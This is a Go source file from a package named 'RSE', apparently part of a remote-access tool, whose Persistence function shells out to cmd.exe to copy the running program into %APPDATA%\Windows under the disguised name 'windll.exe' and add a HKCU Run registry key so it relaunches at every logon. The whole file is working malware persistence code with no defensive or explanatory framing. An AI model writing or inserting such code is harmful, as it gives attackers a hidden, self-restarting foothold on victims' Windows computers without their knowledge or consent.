package RSE


import "syscall"
import "os"

var StatupInfo syscall.StartupInfo
var ProcessInfo syscall.ProcessInformation



func Persistence()  {

  Args := syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c mkdir %APPDATA%\\Windows")

  syscall.CreateProcess(
      nil,
      Args,
      nil,
      nil,
      true,
      0,
      nil,
      nil,
      &StatupInfo,
      &ProcessInfo)

    CopyString := string("c:\\windows\\system32\\cmd.exe /c copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe")

    Args = syscall.StringToUTF16Ptr(CopyString)

    syscall.CreateProcess(
        nil,
        Args,
        nil,
        nil,
        true,
        0,
        nil,
        nil,
        &StatupInfo,
        &ProcessInfo)

      Args = syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe")

      syscall.CreateProcess(
          nil,
          Args,
          nil,
          nil,
          true,
          0,
          nil,
          nil,
          &StatupInfo,
          &ProcessInfo)

}
